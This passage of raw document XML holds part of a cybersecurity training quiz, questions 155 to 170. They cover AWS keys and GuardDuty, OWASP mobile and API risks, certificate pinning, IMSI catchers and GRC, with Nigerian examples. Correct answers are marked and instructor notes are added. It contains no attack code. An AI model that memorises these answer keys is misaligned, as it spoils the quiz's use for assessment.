      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Immediately revoke the compromised keys in AWS IAM and rotate with new keys</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Critical] · *Time:* 60 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Bots scan GitHub for AWS keys within SECONDS of a public commit. Making the repo private doesn't help — bots already grabbed the keys. Revoke FIRST, then investigate what was accessed.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q156</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OWASP Mobile Top 10: M1 (Improper Credential Usage) most commonly manifests as:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Users choosing weak passwords on mobile apps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Mobile apps failing to enforce screen lock policies</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Hardcoded credentials (API keys, passwords) found in the app's source code or binary</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Unencrypted data transmitted over HTTP instead of HTTPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Reverse-engineering a mobile APK with jadx reveals hardcoded credentials in minutes. Very common in Nigerian fintech apps built quickly without security review.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q157</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AWS GuardDuty is designed to:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Prevent S3 buckets from being made public</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Enforce IAM policies across all AWS resources</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Back up all AWS resources to a secondary region</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Continuously monitor AWS accounts for suspicious activity and known malicious behaviours using ML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Recall] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* GuardDuty = threat detection service. Analyses CloudTrail, VPC Flow Logs, DNS logs. Alerts on: crypto mining, data exfiltration, C2 communication, credential compromise.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q158</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OWASP API Security Top 10: API1 (BOLA) stands for:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Broken Object Layer Architecture</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">B) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Broken Object Level Authorisation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Basic Object Logical Access</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Binary Object Layer Authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Recall] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* BOLA = previously called IDOR. API1 because it's the most common and impactful API vulnerability. User can access any object by changing an ID parameter.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q159</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is "certificate pinning" in mobile security?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Pinning app certificates to a user's fingerprint for authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) A technique to prevent apps from being installed on rooted devices</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Hardcoding a specific TLS certificate or key into the mobile app to prevent MitM attacks even with rogue CAs</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Generating unique certificates for each mobile device</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Prevents Burp Suite interception of mobile app traffic. Attacker installs their own CA cert → normally intercepts HTTPS. Pinning checks only the expected cert, not the system CA store.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q160</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which attack uses a rogue cellular base station to intercept mobile communications?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Evil twin attack</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Bluetooth MITM attack</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IMSI catcher (Stingray) attack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) SS7 protocol exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Recall] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* IMSI catchers impersonate cell towers, force phones to connect, intercept calls/SMS. Government-level capability but documented in several West African countries.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q161</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cloud Security Posture Management (CSPM) tools help by:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Managing cloud provider security contracts and SLAs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Encrypting all data stored in cloud environments</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Scanning cloud infrastructure for compliance violations and misconfigurations ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Automating cloud deployments using infrastructure-as-code</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* CSPM = continuous misconfiguration scanning. "Did any S3 bucket just become public? Did any security group open port 22 to 0.0.0.0/0?" Catches drift from secure baseline.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q162</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What does "serverless" mean from a security perspective?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) No security controls are needed as there is no server to protect</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Security responsibilities shift entirely to the cloud provider</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The customer doesn't manage OS or infrastructure — but still owns application code security and IAM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Serverless functions cannot be exploited by attackers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Lambda/Functions = serverless. Still vulnerable to injection in code, over-permissive IAM roles, insecure dependencies. Different attack surface, not zero attack surface.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q163</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Jailbreaking an iPhone or rooting an Android device creates security risks because:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) The device warranty is voided making repairs expensive</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) App Store and Play Store cannot install apps on modified devices</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Security controls and sandboxing are removed, allowing apps to access system resources and other apps' data</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) The device requires more frequent charging after modification</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Many Nigerian enterprise MDM policies block rooted devices from accessing corporate resources. BYOD policy must address this.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q164</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which AWS service aggregates findings from GuardDuty, Inspector, Macie, and other tools into a single security dashboard?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) AWS CloudWatch</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) AWS CloudTrail</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) AWS Config</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AWS Security Hub</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Recall] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Security Hub = "single pane of glass" for AWS security. Maps to CIS benchmarks, NIST CSF, PCI DSS. Shows overall security score.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q165</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ★ DOUBLE POINTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A Nigerian fintech company builds a mobile banking app. A security audit finds: (1) The API key for their payment gateway is hardcoded in the APK, (2) The app doesn't use certificate pinning, (3) The app stores session tokens in SharedPreferences (unencrypted). Rank these vulnerabilities by severity and name the correct OWASP Mobile category for each.</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) All equal severity; all fall under M3 Insecure Authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Token storage=Critical (M9); API key=High (M1); Cert pinning=Low (M4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>API key hardcoding=Critical (M1); No cert pinning=High (M5 Insecure Communication); Token in SharedPreferences=High (M9 Insecure Data Storage)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Cert pinning=Critical (M5); SharedPreferences=Medium (M2); API key=Low (M8)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* All three are real findings from Nigerian fintech app audits. Debrief: Hardcoded API key = immediate ₦ loss if attacker reverse-engineers the APK (happens within hours of app store release). Cert pinning bypass = MitM all banking traffic. SharedPreferences token = root access reads all tokens.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>MODULE 12 [PROFESSIONAL]: GRC, Compliance &amp; the Future of Cybersecurity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Level: Professional | Questions: Q166–Q180*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q166</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>GRC stands for:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) General Risk Control</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">B) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Governance, Risk, and Compliance</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Global Regulatory Compliance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Government Risk and Cybercrime</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Recall] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* GRC = the business/management side of cybersecurity. Governance (direction), Risk (threats vs impact), Compliance (regulatory obligations).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q167</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Using the risk formula: Risk = Threat × Vulnerability × Impact. If Threat=8, Vulnerability=3, Impact=9, what is the risk score?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) 20</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) 54</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>216</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) 72</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* 8 × 3 × 9 = 216. Risk scores help prioritise — high vulnerability + high impact + active threat = urgent remediation. Low threat + low impact = low priority.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q168</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ISO 27001 is an international standard for:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Web application security testing methodology</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Cloud provider security certification requirements</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Information Security Management Systems (ISMS)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Cryptographic algorithm standards and key management</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Recall] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* ISO 27001 = the gold standard for enterprise information security governance. Certification requires independent audit. Many Nigerian banks and telcos are ISO 27001 certified.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q169</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The NIST Cybersecurity Framework 2.0 added which new core function in 2024 (compared to the original 2014 framework)?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Detect</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Respond</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Recover</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Govern</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Recall] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Original NIST CSF (2014): Identify, Protect, Detect, Respond, Recover. NIST CSF 2.0 (2024): Added GOVERN as the 6th function — recognising that cybersecurity must be directed from leadership level.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q170</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which Nigerian regulatory body is responsible for enforcing the NDPA 2023 (data protection)?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Nigerian Communications Commission (NCC)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Central Bank of Nigeria (CBN)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) National Information Technology Development Agency (NITDA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nigeria Data Protection Commission (NDPC)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
